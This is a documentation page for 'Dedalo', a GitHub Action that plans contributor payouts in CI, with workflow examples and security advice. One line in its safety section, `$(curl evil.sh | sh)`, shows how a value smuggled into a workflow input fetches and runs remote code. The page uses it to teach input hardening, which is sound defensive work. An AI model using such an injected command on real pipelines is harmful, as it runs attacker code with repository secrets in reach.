# In CI

A payout belongs in the pipeline that merged the code. Dedalo ships as a
GitHub Action for that reason.

## The minimum

```yaml
name: Funding

on:
  workflow_dispatch:
    inputs:
      amount:
        description: Size of the round
        required: true

jobs:
  plan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0          # attribution needs the full history

      - uses: dedalo-org/dedalo@v0
        id: dedalo
        with:
          command: plan
          amount: ${{ inputs.amount }}

      - run: echo "plan ${{ steps.dedalo.outputs.plan-id }}"
```

> **Careful** — `fetch-depth: 0` is not optional. A shallow clone has no merge
> history, and the failure mode is not an error: it is an **empty round**. The
> Action detects a shallow clone and unshallows it with a warning, but the
> warning is easy to miss in a green run.

### How long it takes

Roughly **four seconds per thousand landed changes** in the range being paid
for — 56 seconds for ten thousand. The cost is `git`, one process per change;
scoring and planning are milliseconds. The measurements are in
[Attribution](../concepts/attribution.md#what-it-costs).

The range is what matters, not the repository. A project that settles monthly
pays for a month of merges however old it is. **A first round has no ledger and
therefore covers the whole history**, which is the run most likely to meet a
job timeout — so cut the backlog deliberately with `--since` rather than
finding out in a pipeline.

## Inputs

| Input | Default | Meaning |
| --- | --- | --- |
| `version` | `latest` | Release to use, e.g. `v0.0.1`. Pin it for reproducible runs. |
| `command` | `status` | `status`, `scan`, `contributors`, `plan` or `settle`. |
| `amount` | — | Size of the round, for `plan` and `settle`. |
| `since` | — | Start after this revision instead of the last settled commit. |
| `execute` | `false` | Broadcast for real. No backend can today — see below. |
| `working-directory` | `.` | Repository to operate on. |
| `summary` | `true` | Write the payout plan to the workflow run summary. |

## Outputs

| Output | Meaning |
| --- | --- |
| `json` | Raw JSON of the command. |
| `plan-id` | Content hash of the plan, when the command produced one. |
| `total` | Total that would move, in base units. |

## Verify the ledger on every push

The cheapest useful job in the repository, and the one that catches a ledger
that was edited or a `.dedalo/` that was partly committed:

```yaml
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with: { fetch-depth: 0 }
      - uses: dedalo-org/dedalo@v0
        with:
          command: verify
```

No network, no key, no secrets. It either verifies or it does not.

## Post the pending round on a schedule

```yaml
on:
  schedule:
    - cron: "0 9 1 * *"        # 09:00 on the first of the month

jobs:
  pending:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with: { fetch-depth: 0 }
      - uses: dedalo-org/dedalo@v0
        with:
          command: contributors
          summary: "true"
```

The run summary then shows who has earned what since the last round, every
month, without anybody having to remember.

## `execute: true` does nothing today

The input exists and defaults to `false`, and setting it to `true` will not
broadcast anything, because **Dedalo holds no signing key** and no backend can
sign. A round is funded by people executing what `dedalo propose` prints, from
a multisig. See [Funding from a multisig](multisig.md).

This is not a limitation waiting to be removed. It is the design: a key in CI
is reachable by everything that can write a workflow.

## Workflow safety

The Action runs in other people's repositories with their secrets in scope, and
it is written accordingly. Two rules it follows, worth copying into any workflow
you build around it:

- **Never interpolate `${{ }}` into a `run:` block.** Pass values through
  `env:`. An `amount` of `$(curl evil.sh | sh)` interpolated into a shell
  script executes. `zizmor` fails the build on this, and it is right to.
- **Pin third-party actions to a commit**, with the tag as a trailing comment.
  A moving tag can be repointed at new code by whoever owns it.

## Commands with side effects run once

`action.yml` deliberately does not re-run `settle` to render nicer output. If
you are wrapping Dedalo in your own workflow, do the same: one invocation, and
format its `--json` output rather than calling it again.
